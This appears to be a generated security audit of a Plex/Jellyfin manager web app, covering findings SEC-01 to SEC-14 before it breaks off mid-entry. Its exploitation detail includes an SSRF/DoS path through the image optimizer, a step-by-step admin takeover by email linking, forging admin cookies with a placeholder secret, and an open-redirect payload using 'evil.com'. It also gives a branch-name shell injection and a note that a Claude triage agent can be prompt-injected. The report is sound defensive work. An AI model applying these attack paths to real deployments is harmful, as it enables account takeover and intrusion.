# Security Audit

Generated 2026-10-17 · 4 auditor(s) · every finding re-checked by a verifier; critical/high findings also survived an independent refutation attempt.

Scope: authentication and authorization (sec-authz), the web layer (sec-web), secrets, crypto, infrastructure and dependencies (sec-secrets), and the AI, Discord, Stripe, BullMQ and watchlist integrations (sec-ai-integrations). The four auditors filed 73 findings. After merging findings that share a root cause, 57 remain. One of them (SEC-17) was raised by two verifiers rather than filed by an auditor. Each finding lists its original auditor IDs under **Sources**.

**Status legend**

| Status | Meaning |
|---|---|
| verified | Re-checked by a verifier, and for critical/high also survived an independent refutation attempt |
| confirmed | Verifier confirmed the finding as written |
| adjusted | Verifier confirmed the core issue but corrected the severity, impact or details (the corrections are folded in here) |
| disputed | Reviewers disagree on the severity; both sides are summarised |
| unverified | Not re-checked (no finding in this report has this status) |

## Executive summary

- **Upgrade Next.js now (SEC-01).** The installed `next@16.1.1` is 38 advisories behind; `>=16.3.8` fixes them. The config allows any host over http and https for images (`images.remotePatterns` hostname `**`), so `/_next/image` downloads and decodes whatever URL an anonymous caller gives it. That allows a crash through memory exhaustion, filling the disk cache, and blind SSRF through DNS rebinding. The same version also lets a `null` origin bypass the CSRF check on Server Actions. The reviewers disagree on whether the critical AVIF RCE is reachable with the locked libheif 1.20.2. Setting `images.unoptimized: true` is a one-line stopgap.
- **The CI pipeline publishes untrusted pull-request code to the public GHCR image as `:latest` and `:main` (SEC-02).** Anyone deploying from those tags runs whatever a PR author put in the Dockerfile.
- **Account takeover, including the admin account, through email-based account linking (SEC-08).** Jellyfin sign-in treats the Jellyfin username as an email address and links the session to whichever existing user has that email, keeping that user's admin flag. Any Jellyfin user can rename themselves to the owner's Plex email, so the attack is deterministic.
- **Public Rewind share links leak other members' viewing data and cannot be revoked (SEC-16).** The share API and the RSC payload carry the whole stored wrapped. That includes leaderboards of every server user with usernames and watch time, plus the sharer's email as a fallback name. A share token is created automatically and is never cleared. This must be designed out of Rewind 2026.
- **Rewind and LLM generation have no rate limit, lock, year bound or spend cap (SEC-22, SEC-23).** Any invited user can trigger dozens of paid LLM calls in parallel, and Discord members can loop the assistant. Move generation into a deduplicated BullMQ job, add per-user quotas, and record failed LLM calls too.
- **The Stripe paywall is enforced only by the `(app)` layout (SEC-28).** Server actions, route handlers and background jobs never check entitlement. Watchlist sync files Overseerr requests under the admin API key, so every user's requests are auto-approved (SEC-27).
- **Several paths leak secrets.** Admin invite pages send every invitee's raw `plexAuthToken` to the browser (SEC-18). Leaving a secret blank on a settings form, with a new URL, sends the stored token to that new URL (SEC-31). The placeholder `NEXTAUTH_SECRET` is accepted at boot (SEC-09). Losing `ENCRYPTION_KEY` locks out every user (SEC-32). At-rest encryption is off by default (SEC-33).
- **Rate limiting is weak by design and missing where it matters (SEC-24, SEC-25, SEC-26).** All limiters share one in-memory Map keyed by a client-spoofable `X-Forwarded-For`. NextAuth, invite and Plex PIN endpoints are not throttled at all. The public share page shares one bucket among all its visitors.
- **The Stripe state machine trusts event order and stale snapshots (SEC-37 to SEC-41).** A late event can bring back a canceled subscription. A late revoke can unshare a paying subscriber. Users can end up with two subscriptions. Events resent from the Stripe dashboard are dropped as duplicates.
- **A fresh install can be hijacked before setup completes (SEC-30).** Setup actions are unauthenticated until the wizard is finished. Related problems: the Plex PIN poll returns account tokens without being tied to the browser that started it (SEC-11), and sessions stay valid for days after a user loses access (SEC-10).

## Severity summary

| Severity | Count |
|---|---|
| Critical | 1 |
| High | 4 |
| Medium | 29 |
| Low | 23 |
| Info | 0 |
| **Total** | **57** |

Only non-refuted findings are counted. No finding was refuted outright; claims that were ruled out are listed in the appendix. SEC-01 is counted as critical, but its severity is disputed (the web-layer pipeline rated it high). Two auditors' info-level items were folded into SEC-09 and SEC-07.

## Findings

### 1. Dependencies, build and deployment

#### SEC-01: Next.js 16.1.1 is 38 advisories behind, and wildcard `images.remotePatterns` exposes the image optimizer to anonymous callers

- **Severity:** Critical (disputed; see below)
- **Status:** disputed. Both pipelines and both refutation attempts verified the facts; only the severity is contested.
- **Sources:** SEC-INFRA-02, WEB-01, WEB-10
- **Where:** `package.json:46`, `next.config.js:6-17`, `node_modules/next/dist/server/image-optimizer.js:791-865`, `proxy.ts:69`, `components/admin/users/user-table-row.tsx:76`, `components/admin/invites/invite-details-client.tsx:273`, `package-lock.json`
- **Evidence:**
  ```js
  // next.config.js:6-17
  images: { remotePatterns: [ { protocol: 'https', hostname: '**' }, { protocol: 'http', hostname: '**' } ] }
  ```
  - **Installed versions:** `next` 16.1.1 (latest 16.4.2) and `sharp` 0.34.5.
  - **`npm audit --omit=dev` lists 38 `next` advisories:**
    - GHSA-2xp9-vwfh-vxw4: critical, image optimizer RCE when AVIF files are used, fixed in 16.3.3.
    - GHSA-cjq9-62q9-8jv4: high, image optimizer SSRF, fixed in 16.3.8. The advisory says "If no images.remotePatterns are configured, your app is not affected".
    - GHSA-9g9p, GHSA-3x4c, GHSA-h64f, GHSA-q8wf: optimizer DoS and unbounded disk-cache growth.
    - GHSA-h25m, GHSA-q4gf, GHSA-8h8q, GHSA-m99w: unauthenticated RSC and Server Action DoS.
    - GHSA-mq59-m269-xvcx: a `null` origin bypasses the Server Action CSRF check, fixed in 16.1.7.
    - GHSA-955p-x3mx-jcvp: disclosure of internal Server Function endpoints, fixed in 16.2.11.
    - GHSA-89xv-2m56-2m9x.
  - **`sharp` advisories:** GHSA-f88m (libvips), GHSA-rgj7 (libheif) and GHSA-wq5f (librsvg).
  - **How the optimizer fetches:** `fetchExternalImage` calls `lookup()` and `isPrivateIp`, then calls `fetch(href)`, which resolves DNS a second time. It then buffers the whole body with `Buffer.from(await res.arrayBuffer())`, with no size cap.
  - **No gate in front of it:** `proxy.ts` excludes `_next/image` from its matcher.
  - **The optimizer is barely used:** 6 of the 8 `next/image` usages already pass `unoptimized`.
- **Impact:** an unauthenticated visitor can:
  - send many large concurrent downloads and crash the single Node process that serves the whole app;
  - fill `.next/cache/images` with unique URLs;
  - run blind GET SSRF into internal hosts through DNS rebinding, with the upstream status code returned as an oracle;
  - use the server as an anonymous image proxy;
  - trigger the RSC and Server Action DoS advisories on any page.

  Separately, the null-origin CSRF bypass lets an opaque-origin page on the same site trigger admin Server Actions such as `createInvite`, `updatePlexServer` (which chains into SEC-31) and `setStripeEnabled`. The endpoint-disclosure advisory also removes the obscurity that SEC-35 depends on.
- **Both sides of the dispute:**
  - *Critical (secrets pipeline: verifier and refutation).* Attacker-hosted AVIF bytes are sniffed as AVIF and passed to `optimizeImage`, so they reach sharp/libheif. A publicly disclosed critical RCE sits in a component that anyone can reach without logging in. The refutation reviewer could not fetch the advisory text to confirm its preconditions.
  - *High (web pipeline: verifier and refutation).* GHSA-2xp9 traces to libheif GHSA-g89c-p67h-r497, which affects libheif 1.22.0 to 1.23.1. The locked `@img/sharp-libvips-linux-x64` and `@img/sharp-libvips-linuxmusl-x64` both bundle `"heif": "1.20.2"` (re-checked for this report). The Dockerfile uses `npm ci`, so the RCE is not reachable as locked. What remains (DoS, SSRF, disk exhaustion) is still high.
  - *Both agree:* the finding is at least high, and the fix is the same. A future lockfile refresh could pull an affected libheif while `next` is still below 16.3.3.
- **Recommendation:**
  - Upgrade `next` and `eslint-config-next` to `^16.4.2`, which also brings a patched sharp.
  - Today, set `images: { unoptimized: true }` (with it, `next-server.js:256` returns 404 for the optimizer), or restrict `remotePatterns` to https `plex.tv` / `*.plex.tv` plus the avatar hosts actually used. Never allow http `**`, and leave `dangerouslyAllowLocalIP` unset.
  - Add an `npm audit --omit=dev --audit-level=high` (or osv-scanner) gate to `build.yml`, and enable grouped Dependabot security updates.
  - Until the upgrade ships, consider a per-session CSRF token on sensitive admin actions.
- **Effort:** S

#### SEC-02: Docker publish workflow builds and pushes untrusted PR code as `:latest` and `:main`

- **Severity:** High
- **Status:** verified. The verifier argued for critical; the refutation reviewer confirmed the finding but lowered it to high.
- **Sources:** SEC-INFRA-01
- **Where:** `.github/workflows/docker-publish.yml:4-7`, `:29`, `:30-32`, `:39`, `:57`, `:63`, `:69`; `.github/workflows/build.yml:7`
- **Evidence:**
  ```yaml
  on: { workflow_run: { workflows: ["Build"], types: [completed] } }          # :4-7
  if: ... github.event.workflow_run.conclusion == 'success'                  # :29
  permissions: { contents: read, packages: write }                           # :30-32
  ref: ${{ github.event.workflow_run.head_sha || github.ref }}               # :39
  type=raw,value=latest,enable={{is_default_branch}}                         # :63
  push: ${{ github.event_name != 'pull_request' }}                           # :69
  ```
  - **Trigger:** Build runs on every `pull_request:` (`build.yml:7`), including fork PRs, and never builds the Dockerfile.
  - **Workflow context:** a `workflow_run` job runs in the base repo with a write token. `github.ref` and `github.sha` point at `main`, so the PR's code is tagged `main`, `latest` and `sha-<main HEAD>`.
  - **Exposure:** the repo is public, and the GHCR tags are anonymously pullable.
- **Impact:** a fork contributor who has had a PR merged before, or a first-timer once a maintainer clicks "Approve and run workflows", can publish a modified Dockerfile as `ghcr.io/mchestr/plex-manager:latest`. Anyone deploying from `:latest` or `:main` then runs attacker code with access to the database, the Plex owner token, Stripe keys and the Discord bot token. Even without an attacker, every same-repo PR branch that passes Build is published as `:latest` before review, under a sha tag that names main's HEAD.
- **Severity reasoning:** the refutation reviewer lowered it to high for three reasons:
  - first-time fork contributors need a maintainer's approval click;
  - the README and compose file tell users to build locally, and `forks_count` is 0;
  - it cannot be exploited from the app's own attack surface.
- **Recommendation:**
  - Publish only from trusted refs. Either trigger on `push` to `main` and tags, or require `github.event.workflow_run.event == 'push' && github.event.workflow_run.head_branch == 'main' && github.event.workflow_run.head_repository.full_name == github.repository`.
  - Never check out a PR's `head_sha` in a job that holds `packages: write`. Build PR images in a separate job with no push and read-only permissions.
  - Pin actions to commit SHAs, add provenance or signing (cosign or `actions/attest-build-provenance`), and document digest pinning for operators.
- **Effort:** S

#### SEC-03: Docker image runs on end-of-life Node 25, installs the Prisma CLI at runtime without a lockfile, and has writable app files and no healthcheck

- **Severity:** Medium
- **Status:** adjusted
- **Sources:** SEC-INFRA-10
- **Where:** `Dockerfile:1`, `:38-40`, `:48-56`, `:60-64`, `:75-76`; `docker-entrypoint.sh:5`; `.github/workflows/build.yml:36`; `package.json:6`; `.dockerignore:23-25`
- **Evidence:**
  - **Base image (`Dockerfile:1`):** `FROM node:25.8-alpine AS base`. It is not pinned by digest, and Node 25 reached end-of-life on 2026-06-01.
  - **Version drift:** CI tests on Node 22 (`node-version: '22'`), while `engines` still allows the end-of-life Node 20 (`^20.19 || ^22.12 || >=24.0`).
  - **Runtime install (`:60-64`):** `npm install --no-package-lock "prisma@${PRISMA_VERSION}" "dotenv@${DOTENV_VERSION}"`.
  - **Writable code (`:48-56`, `:64`):** app code and `node_modules` are chowned to the runtime user.
  - **No healthcheck:** there is no `HEALTHCHECK`, and `app/api` has no health route.
- **Impact:**
  - The production runtime gets no Node security fixes and runs a different major version than CI tests.
  - Builds are not reproducible, and they ship the Prisma CLI's vulnerable transitive dependencies (hono, `@hono/node-server`, effect, mysql2), although those are migration-time tooling.
  - A compromised process can rewrite server code and persist inside the container.
  - Orchestrators cannot detect a hung app.
- **Verifier corrections:**
  - The missing `NODE_ENV` has no effect, because standalone `server.js` forces production.
  - npm forwards SIGTERM, so the shutdown handlers generally still run.
  - The `.env.development` / `data/` leakage concern is theoretical: none of those files exist.
- **Recommendation:**
  - Move to `node:24-alpine` (LTS), pinned by digest, and align the CI `node-version` and `engines` (drop `^20.19`).
  - Install prisma/dotenv from the lockfile in a separate `npm ci` stage, or run migrations as a one-shot job.
  - Copy app files root-owned, leaving only `.next/cache` writable.
  - Use `CMD ["node","server.js"]` with `--init` or tini.
  - Add `/api/health` (database plus optional Redis) and a `HEALTHCHECK`.
  - Optionally widen `.dockerignore` to cover `.env*` and `data/`.
- **Effort:** S

#### SEC-04: docker-compose publishes Postgres (default password) and Redis (no auth) on all interfaces

- **Severity:** Medium
- **Status:** adjusted
- **Sources:** SEC-INFRA-11
- **Where:** `docker-compose.yml:20`, `:25-27`, `:36`, `:39`, `:46-47`, `:50`, `:58`, `:61`; `lib/queue/jobs/stripe.ts:406-450`
- **Evidence:**
  - **Postgres:** `POSTGRES_PASSWORD=postgres`, published as `- "5432:5432"` and `- "5433:5432"`.
  - **Redis:** published as `- "6379:6379"`, with `command: redis-server --appendonly yes` and no `requirepass`.
  - **Start-up race:** `depends_on` has no health condition, while `docker-entrypoint.sh` runs `prisma migrate deploy` under `set -e`.
  - Docker-published ports bypass host firewalls such as ufw.
- **Impact:** on a VPS with a public address, an unauthenticated attacker gets full read/write on the database: secrets (plaintext by default), PII, and the ability to insert an admin user. With Redis they can enqueue `PLEX_ACCESS_GRANT` jobs for existing user rows.
- **Verifier corrections:**
  - The file is clearly dev-oriented (`container_name: plex-wrapped-dev`, a db-playwright service, localhost URLs pinned in `environment:`), so a remote deployment would have to edit it.
  - A Redis attacker cannot grant access to arbitrary accounts, only to existing User rows that have an email.
  - Re-checking "ACTIVE" in the grant job would break admin comp grants (`actions/admin/subscriptions.ts:141-151`).
- **Recommendation:**
  - Bind dev ports to `127.0.0.1` or drop the DB/Redis port mappings. Set a Redis password and take the DB password from `.env`.
  - Ship a `docker-compose.prod.yml` with no published DB/Redis ports, a Postgres healthcheck with `condition: service_healthy`, and restart policies.
  - As defence in depth, have `processPlexAccessGrant` re-check entitlement: an ACTIVE/TRIALING subscription, or `isExempt`.
- **Effort:** S

#### SEC-05: CI hardening gaps: a dormant script injection, mutable action tags, and an issue-triage agent driven by untrusted text

- **Severity:** Low
- **Status:** adjusted
- **Sources:** SEC-INFRA-09
- **Where:** `.github/workflows/test-analyze-failure.yml:11`, `:14-16`, `:28`, `:58`, `:68`, `:76`, `:88`, `:93`; `.github/workflows/claude-issue-triage.yml:12-14`, `:28`, `:30`; `.github/workflows/build.yml:1`; `.github/dependabot.yml:4`
- **Evidence:**
  - **`test-analyze-failure.yml`:**
    - holds `permissions: actions: write` and uses `anthropics/claude-code-action@main`;
    - runs `OUTPUT='${{ steps.detect.outputs.structured_output }}'` in shell;
    - runs `--ref "${{ github.event.workflow_run.head_branch }}"`, which pastes a fork-controlled branch name into shell;
    - is dormant only because it watches `workflows: ["CI"]`, and no workflow has that name.
  - **`claude-issue-triage.yml:30`:** sets `allowed_non_write_users: "*"` with `issues: write`, and calls `/label-issue`, but only `label-issues.md` exists.
  - **`build.yml`:** has no `permissions:` block and no audit or CodeQL step.
  - **`dependabot.yml`:** has no groups.
- **Impact:**
  - Renaming any workflow to "CI" would switch on command injection with an `actions: write` token.
  - Any GitHub user can prompt-inject an agent that holds `issues: write`, and burn the owner's Claude quota.
  - A compromised mutable tag would run code in jobs that publish packages.
- **Recommendation:**
  - Delete `test-analyze-failure.yml`, or pass values through `env:` with quoting and pin the action.
  - Restrict triage to trusted actors, or give it an explicit read-only tool allowlist like `claude-duplicate-review.yml:64`, and fix the command name.
  - Add top-level `permissions: contents: read` to `build.yml`.
  - Pin third-party actions to SHAs, starting with claude-code-action, and add grouped Dependabot updates. The audit gate is tracked under SEC-01 and SHA pinning under SEC-02.
- **Effort:** S

#### SEC-06: Remaining production advisories (discord.js/undici/ws, bullmq/uuid, qs, Prisma toolchain)

- **Severity:** Low
- **Status:** confirmed
- **Sources:** SEC-INFRA-13
- **Where:** `package.json:37`, `:40`, `:48`, `:80`; `package-lock.json`; `lib/plex-auth.ts:5`
- **Evidence:** `npm audit --omit=dev` reports 30 vulnerabilities (2 critical, 17 high, 11 moderate):
  - **Via discord.js / `@discordjs/rest`:** undici 6.21.3 with 15 advisories (for example GHSA-f269-vfmq-vjvj and GHSA-vrm6-8vpv-qv8q), plus ws 8.18.3 (GHSA-96hv-2xvq-fx4p).
  - **Shared libraries:** lodash 4.17.21 (GHSA-r5fr-rjxr-66jc), uuid via next-auth/bullmq (GHSA-w5hq-g745-h8pq) and qs 6.14.1 (GHSA-4mjr, GHSA-q8mj).
  - **Prisma toolchain:** prisma 7.2.0 pulls in `@prisma/dev`, which brings hono 4.10.6 (about 40 advisories), effect, defu, deepmerge-ts, valibot and mysql2.
  - **Full tree:** 75 vulnerabilities.
  - **Fix availability:** every production advisory has a non-major fix. Some dev-tree fixes (eslint-config-next, micromatch, braces, fast-glob) are semver-major.
  - **qs usage:** qs is used for a single stringify call.
- **Impact:** most of these need a malicious Discord or Redis endpoint, or only affect dev tooling. However, leaving 30 open production advisories hides the critical ones, and the Prisma CLI chain ships in the runtime image (SEC-03).
- **Recommendation:**
  - Run `npm update` (discord.js ^14.27, the latest bullmq, the latest 7.x of prisma/@prisma/client, qs 6.16) and `npm audit fix`.
  - Gate CI on high-severity production advisories.
  - Replace qs with `URLSearchParams`, and keep the Prisma CLI out of the runtime image.
- **Effort:** S

#### SEC-07: next-auth v4 is in maintenance; unused `@next-auth/prisma-adapter`; ts-node is stale

- **Severity:** Low
- **Status:** adjusted
- **Sources:** SEC-INFRA-14, AUTH-17 (version part)
- **Where:** `package.json:33`, `:47`, `:82`; `lib/auth.ts:20`, `:438`
- **Evidence:**
  - **next-auth version:** 4.24.13 is installed. 4.24.15 fixes GHSA-7rqj-j65f-68wh, GHSA-xmf8-cvqr-rfgj and GHSA-x445-f3h2-j279, none of which is reachable here: only `CredentialsProvider` is used, and `getToken` is never called.
  - **v5 status:** `npm dist-tags` shows `beta: 5.0.0-beta.32`, so v5 has never reached GA.
  - **Unused adapter:** `@next-auth/prisma-adapter` is never imported; `lib/auth.ts:20` says "PrismaAdapter is not compatible with CredentialsProvider".
  - **ts-node:** 10.9.2, released December 2023.
- **Impact:** a maintainability concern rather than an active weakness.
  - v4 still receives security releases (4.24.14 on 2026-04-14 and 4.24.15 on 2026-07-20).
  - next-auth 4.24.13 declares Next `^16` as a supported peer, so v4 on Next 16 is supported.
  - Features Rewind 2026 may want, such as database sessions, revocation and passkeys, will not arrive in v4.
- **Recommendation:**
  - Now (S): bump next-auth to 4.24.15 and remove the unused adapter.
  - Later: replace ts-node with tsx. The seed and the Discord scripts use ts-node, so it cannot simply be dropped.
  - Track a migration (Better Auth, or Auth.js v5 once it reaches GA) as a roadmap item together with session revocation (SEC-10).
- **Effort:** S now; L for the auth migration

### 2. Authentication and sessions

#### SEC-08: Email-based account linking on unverified identifiers enables account takeover, including the admin

- **Severity:** High
- **Status:** verified (the refutation attempt failed and found a more reliable, deterministic path)
- **Sources:** AUTH-02
- **Where:** `lib/auth.ts:202`, `:324-348`, `:394`; `actions/invite.ts:315-325`, `:793`, `:847`, `:870`, `:895`; `prisma/schema.prisma:17`
- **Evidence:**
  ```ts
  // lib/auth.ts:324-348 (no row matches jellyfinUserId)
  emailSchema.safeParse(jellyfinUser.username)
  dbUser = await prisma.user.update({ where: { id: userByEmail.id },
    data: { jellyfinUserId: jellyfinUser.id, ..., isAdmin: isAdmin || userByEmail.isAdmin } })
  // lib/auth.ts:394 (existing Jellyfin user)
  email: jellyfinUser.username.includes('@') ? jellyfinUser.username : dbUser.email
  // actions/invite.ts:793
  if (username.length < 3)
  ```
  - **Invite redemption leaves a race window.** `processJellyfinInvite` creates the Jellyfin user (`:847`) and makes two more Jellyfin HTTP calls (`lib/connections/jellyfin-users.ts:117-160`). Only then does it write the app row (`:895`). In between, the new account can authenticate but has no app row.
  - **Nothing in Jellyfin or the app blocks the rename.** Jellyfin allows `@` in usernames. By default a user can rename themselves, because `EnableUserPreferenceAccess` defaults to true. `authRateLimiter` is never used.
- **Impact:** a Jellyfin user who knows the target's Plex email (lowercase) signs in as that user. Admins are included, because the link keeps `userByEmail.isAdmin`. The result is full admin takeover: config, LLM keys, invites and unsharing users. The link persists across logins, and admin rights come back every time the real owner logs in through Plex. In the pre-claim variant, an attacker sets their username to a not-yet-registered Plex user's email, which `:394` writes into `User.email`. When that victim later redeems an invite, `findOrCreateUser` merges the victim's Plex identity and token into the attacker's row. If the victim signs in directly instead, the create at `:202` fails on the unique email and they are permanently locked out.
- **Scenario (deterministic):**
  1. Mallory has a Jellyfin account with no app row.
  2. She renames herself in Jellyfin to `owner@example.com` with `POST /Users`.
  3. She signs in with the Jellyfin provider.
  4. `authorize` finds no row by `jellyfinUserId` and matches the admin row by email. The JWT gets `sub = adminId` and `isAdmin = true`.
- **Recommendation:**
  - Stop auto-linking by email. Link only through an explicit, authenticated action (signed in with both providers in one session) or a mapping an admin has confirmed.
  - Validate Jellyfin invite usernames with Zod and forbid `@` (for example `/^[A-Za-z0-9._-]{3,32}$/`).
  - Write the app row before the Jellyfin account can authenticate, or create the account disabled and enable it afterwards.
  - Never carry `isAdmin` across a link, and never write the Jellyfin username into `User.email`.
- **Effort:** M

#### SEC-09: No startup env validation; the placeholder `NEXTAUTH_SECRET` is accepted, which lets anyone mint admin cookies

- **Severity:** Medium
- **Status:** adjusted
- **Sources:** SEC-INFRA-03, AUTH-17 (cookie and URL part)
- **Where:** `example.env:14`, `instrumentation.ts:1-16`, `lib/utils.ts:33-56`, `lib/security/ip-hash.ts:15`, `lib/auth.ts:434-443`, `lib/admin.ts:37`, `docker-compose.yml:24`, `.github/workflows/build.yml:98`, `CLAUDE.md:691`
- **Evidence:**
  - **Placeholder secret:** `example.env:14` ships `NEXTAUTH_SECRET="your-secret-key-here-generate-with-openssl-rand-base64-32"`.
  - **No validation:** `instrumentation.ts` only starts workers and validates no env vars. `getBaseUrl`, `PLEX_CLIENT_IDENTIFIER` and `ENCRYPTION_KEY` fail lazily, which contradicts CLAUDE.md:691 ("app will fail on startup if missing").
  - **Forgery confirmed:** the auditor encoded a JWE with the example secret, and it decoded as `{"sub":"does-not-exist","isAdmin":true}`.
  - **Cookie config:** `authOptions` sets no `useSecureCookies`, so the Secure flag is inferred from the scheme of `NEXTAUTH_URL`.
  - **Salt reuse:** `ip-hash.ts:15` reuses `NEXTAUTH_SECRET` as the salt for IP hashing.
- **Impact:** if an operator keeps the placeholder secret, or reuses the public CI value (`build.yml:98`), every visitor can forge an admin session. Misconfigured URLs silently produce non-Secure cookies, and missing env vars surface as runtime 500s rather than a refusal to boot.
- **Verifier corrections:**
  - Medium, not high: the placeholder text itself says to generate a value, and the README and CLAUDE.md say so too.
  - Adding an `else` branch in the jwt callback does not stop forgery, because a forger can use a real admin `sub` (that branch is tracked under SEC-10).
  - NextAuth already reads `NEXTAUTH_SECRET` automatically, and its default cookie is already httpOnly and SameSite=Lax. The http URL in compose is expected in a dev file.
- **Recommendation:**
  - Add a Zod env schema (`lib/env.ts`) and parse it in `register()` for the nodejs runtime.
  - In production, refuse to boot unless `NEXTAUTH_SECRET` is at least 32 random bytes and is not a known placeholder or the CI value, the public URLs use https, and `PLEX_CLIENT_IDENTIFIER` is set.
  - Ship `example.env` with an empty secret, and set `useSecureCookies` explicitly in production.
- **Effort:** S

#### SEC-10: Sessions survive Plex unsharing and access removal; the JWT refresh only re-reads `isAdmin`

- **Severity:** Medium
- **Status:** adjusted
- **Sources:** AUTH-09, SEC-INFRA-03 (missing-user branch)
- **Where:** `lib/auth.ts:17`, `:442`, `:483-507`; `lib/access.ts:74-77`; `actions/user-queries.ts:255-310`
- **Evidence:**
  - **Refresh logic (`lib/auth.ts:483-507`):** it selects only `{ isAdmin: true }`, and `if (dbUser) { ... token.isAdmin = dbUser.isAdmin }` has no else branch.
  - **Lifetime:** `maxAge: 7 * 24 * 60 * 60`.
  - **No entitlement gate with Stripe off:** `if (!config?.stripeEnabled) { return true }` (`lib/access.ts:74-77`).
  - **No invalidation on unshare:** `unshareUserLibrary` leaves the account and session untouched, and there is no session version to bump.
- **Impact:** a member removed from Plex keeps full app access. That covers watchlist requests through the admin key (SEC-27), LLM-backed Rewind generation and Discord features. NextAuth 4.24 JWT sessions roll: `GET /api/auth/session` re-issues the cookie with a fresh `maxAge`. So a removed user who polls that endpoint can keep the session indefinitely. A token whose user row has been deleted stays valid.
- **Verifier corrections:**
  - `isAdmin` itself is re-read every 5 minutes, so admin claims are not stale.
  - The app has no user-deletion path; the deleted-row case only arises from manual DB edits.
  - With Stripe on, the issue is mostly moot because access is gated by subscription status.
- **Recommendation:**
  - Add `User.sessionVersion`, bumped on unshare, demotion, disable and subscription revoke, plus `User.disabledAt`.
  - In the jwt refresh, select `{ isAdmin, sessionVersion, disabledAt }`. Return an empty token when the row is missing or disabled, or when the version differs.
  - Have `unshareUserLibrary` and `PLEX_ACCESS_REVOKE` bump the version.
  - Optionally re-check Plex membership hourly.
- **Effort:** M

#### SEC-11: The public Plex PIN-polling action returns account tokens for any PIN ID; one client identifier is shared app-wide; the PIN is not bound to the browser

- **Severity:** Medium (the WEB-06 verifier rated it medium; the AUTH-15 verifier rated the same issue low)
- **Status:** adjusted
- **Sources:** WEB-06, AUTH-15
- **Where:** `lib/plex-auth.ts:1`, `:27`, `:43-65`, `:71-93`, `:126-148`; `components/auth/plex-sign-in-button.tsx:83`; `app/auth/callback/plex/callback-client.tsx:107`, `:113-114`
- **Evidence:**
  ```ts
  // lib/plex-auth.ts ('use server')
  export async function getPlexAuthToken(pinId: string)
  fetch(`${PLEX_API_ENDPOINT}/pins/${pinId}`, { headers: { "X-Plex-Client-Identifier": clientIdentifier } })
  return data.authToken || null
  ```
  - **No checks on the poll:** no session, cookie binding, PIN `code`, Zod validation or throttle.
  - **Shared identifier:** `clientIdentifier` is the single `PLEX_CLIENT_IDENTIFIER`, and it appears in the browser-visible app.plex.tv URL.
  - **PIN creation is public too:** `createPlexPin` returns `{ id, code }`.
  - **Token in client JS:** the token is returned to the browser and passed to `signIn` / `processInvite`.
- **Impact:** anyone who learns a live, authorised PIN ID can retrieve the victim's plex.tv token through the app. That gives full Plex account access, and sign-in as that user, the admin included. The token is also exposed to any XSS on the callback page.
- **Verifier corrections:**
  - Exploitation depends on the density of Plex-side PIN IDs and on plex.tv rate limits, which nobody has shown.
  - Because the client identifier is public by Plex's design, the app adds little beyond hiding the attacker's IP.
  - Referer leakage is ruled out by `Referrer-Policy: origin-when-cross-origin`.
  - The verifiable weakness is the shared identifier, which goes against Plex guidance, combined with no browser binding.
- **Recommendation:**
  - Generate a random `X-Plex-Client-Identifier` per browser. Store it, with the PIN id and code, in a signed, httpOnly, SameSite=Lax cookie.
  - Make polling take no `pinId`, and finish sign-in server-side so the token never reaches client JS.
  - Rate-limit `createPlexPin` and the polling action, and `encodeURIComponent` the invite code. Log redaction is tracked under SEC-54.
- **Effort:** M

#### SEC-12: Admin role changes made in the UI do not stick; every login recomputes and overwrites `isAdmin`

- **Severity:** Medium
- **Status:** adjusted
- **Sources:** AUTH-08
- **Where:** `lib/auth.ts:193`, `:226-235`, `:395`, `:483-500`; `actions/admin/admin-users.ts:65-68`; `components/admin/users/change-user-role-button.tsx`
- **Evidence:**
  ```ts
  // actions/admin/admin-users.ts:65-68
  prisma.user.update({ where: { id: userId }, data: { isAdmin } })
  // lib/auth.ts:193, 226-235 (every Plex login)
  const isAdmin = plexServer.adminPlexUserId === plexUser.id
  prisma.user.update({ ..., data: { ..., isAdmin } })   // audits ADMIN_PRIVILEGE_REVOKED / GRANTED
  ```
  Jellyfin logins write the value derived from the Jellyfin policy (`:395`). The email-link branch instead keeps `isAdmin || userByEmail.isAdmin`, which is inconsistent with the other branches.
- **Impact:** a user promoted in the UI silently loses admin at their next login, and the audit log records a revoke that nobody performed.
- **Verifier correction:** the security framing ("demotions get reversed") is overstated. Demotions only revert for the Plex owner and Jellyfin administrators, and those accounts already control the media server. The real problem is a visible admin feature that silently does nothing, plus a misleading audit trail.
- **Recommendation:** separate derived admin from manually granted admin (an `adminOverride` or `adminSource` field) and compute effective admin in one helper. At minimum, stop overwriting `isAdmin` for existing rows, except to grant admin to the server owner.
- **Effort:** S

#### SEC-13: Discord OAuth callback has an open redirect through backslash paths; the state is not bound to the browser session

- **Severity:** Low (the WEB-08 verifier kept medium, "at the upper end"; the AUTH-10 and DC-02 verifiers both rated it low)
- **Status:** adjusted
- **Sources:** WEB-08, AUTH-10, DC-02
- **Where:** `lib/discord/integration.ts:56-70`, `:79`, `:109`, `:126-145`, `:173`, `:233`; `app/(app)/discord/connect/route.ts:33-36`; `app/api/discord/callback/route.ts:16-31`, `:27-29`, `:47-48`, `:93-94`
- **Evidence:**
  - **The check is too loose:** `sanitizeRedirectPath` only rejects paths that do not start with `/` or that start with `//`.
  - **Reproduced in Node:** `new URL("/\\evil.com?status=linked", "https://app.example.com").href` gives `https://evil.com/?status=linked`, and `/\t/evil.com` behaves the same.
  - **Where the value comes from:** `?redirect=` on `/discord/connect`. The callback redirects to `new URL(destination, getBaseUrl())`.
  - **State handling:** `consumeOAuthState` looks the state up by value only, with a separate `findUnique` and `update`. The callback never compares the session user to `oauthState.userId`.
- **Impact:** a link such as `/discord/connect?redirect=/%5Cevil.com` takes a logged-in member through Discord's real consent screen and then to an attacker page on the trusted domain's redirect. Because state is not bound, a victim who completes the attacker's authorize URL links their Discord to the attacker's app account, which affects linked roles and the bot's identity mapping.
- **Why low:** the attack needs a logged-in victim who clicks through Discord consent. The redirect only fires on success. The reverse direction (taking over the victim's app account) is impossible. `DiscordConnection.discordUserId` is unique, and Discord codes are single-use. The claim that error text is reflected into a banner was refuted, because no page reads those query params.
- **Recommendation:**
  - Resolve the redirect against the base URL and require the same origin, or use an allowlist; reject backslashes and control characters.
  - In the callback, require a session with `session.user.id === oauthState.userId`, plus an httpOnly binding cookie.
  - Consume the state atomically: `updateMany({ where: { state, consumedAt: null, expiresAt: { gt: now } } })`, requiring `count === 1`.
  - Map callback errors to fixed codes.
- **Effort:** S

#### SEC-14: The "disable Jellyfin login" toggle only hides the button; the credentials provider still accepts Jellyfin logins

- **Severity:** Low
- **Status:** adjusted
- **Sources:** AUTH-12 (toggle part; the rate-limit part is in SEC-24)
